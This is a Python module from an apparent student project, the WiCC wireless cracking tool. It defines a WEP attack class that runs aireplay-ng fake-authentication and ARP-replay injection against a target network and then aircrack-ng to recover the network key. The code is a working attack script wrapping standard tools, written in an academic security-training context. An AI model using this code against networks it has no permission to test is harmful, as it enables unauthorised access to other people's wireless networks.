#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
    WiCC (Wireless Cracking Camp)
    GUI tool for wireless cracking on WEP and WPA/WPA2 networks.
    Project developed by Pablo Sanz Alguacil and Miguel Yanes Fernández, as the Group Project for the 3rd year of the
    Bachelor of Sicence in Computing in Digital Forensics and CyberSecurity, at TU Dublin - Blanchardstown Campus
"""

from wicc_enc_type import EncryptionType
import time
import threading


class WEP(EncryptionType):
    def __init__(self, network, interface, mac, verbose_level):
        """
        Constructor for the WEP class (also calls the parent constructor)
        :param network: target network for the attack
        :param interface: selected wireless interface
        :param mac: attacker mac address
        :param verbose_level: verbose level set by main

        :Author: Miguel Yanes Fernández
        """
        EncryptionType.__init__(self, network, interface, verbose_level)
        # super().__init__(self, network, interface)
        self.mac = mac

    def scan_network(self, write_directory):
        """
        Method to scan the target network. With the selected attacker's mac, makes a fake authentication to the network
        to then send arp responses to generate data.
        :param write_directory: directory to write the scan files
        :return: none

        :Author: Miguel Yanes Fernández
        """
        super(WEP, self).scan_network(write_directory)

        fakeauth_cmd = ['aireplay-ng', '--fakeauth', '0', '-a', self.mac, '-e', self.essid, '-T', '3', self.interface]
        arpreplay_cmd = ['aireplay-ng', '--arpreplay', '-b', self.bssid, '-h', self.mac,
                        '--ignore-negative-one', self.interface]

        #fakeauth_out, err = self.execute_command(fakeauth_cmd)
        #print(fakeauth_out.decode('utf-8'))

        arpreplay_thread = threading.Thread(target=self.execute_command, args=(arpreplay_cmd,))
        arpreplay_thread.start()
        arpreplay_thread.join(0)

        self.show_message("running aireplay thread on mac: " + self.mac)

    def crack_network(self):
        """
        Crack the selected network. Aircrack is left running until if gets enough iv's to crack the connection key
        :return: password key

        :Author: Miguel Yanes Fernández
        """
        aircrack_cmd = ['aircrack-ng', '/tmp/WiCC/net_attack-01.cap']
        self.show_message("will execute aircrack")
        crack_out, crack_err = super().execute_command(aircrack_cmd)
        self.show_message("finished aircrack")
        # will need to filter the output from aircrack
        password = self.filter_aircrack(crack_out.decode('utf-8'))
        return password
